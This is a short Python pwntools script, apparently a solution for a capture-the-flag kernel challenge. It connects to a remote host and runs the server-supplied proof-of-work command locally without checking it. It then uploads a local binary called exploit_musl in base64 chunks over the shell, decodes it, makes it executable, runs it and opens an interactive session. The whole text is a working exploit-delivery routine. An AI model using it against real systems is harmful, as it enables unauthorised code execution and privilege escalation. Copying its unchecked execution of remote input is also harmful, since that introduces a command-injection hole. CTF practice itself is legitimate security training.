import pwn
import subprocess

# pow = subprocess.check_output([])

r = pwn.remote("ctf.k3rn3l4rmy.com", 1003)
pow = r.recvline().split(b":")[1].strip().decode()
pow = subprocess.check_output(pow.split())
print(pow)
r.sendline(pow)
r.sendlineafter(b"$", b'cd /home/ctf; echo "start" >&2; while read line; do if [ "$line" = "end" ]; then break; fi; echo -n $line; done > tmp')

print('start')

payload = pwn.b64e(pwn.read("./exploit_musl"))
r.recvuntil(b"start\r\n")
pwn.sleep(0.5)
to_send = payload.encode()
while to_send:
    r.sendline(to_send[:1000])
    to_send = to_send[1000:]
    print('.', end="")
r.send(b"\nend\n")

r.sendlineafter(b"$", b"base64 -d tmp > exploit; chmod +x exploit")
r.sendlineafter(b"$", b"./exploit")

# r.recvall()
r.interactive()
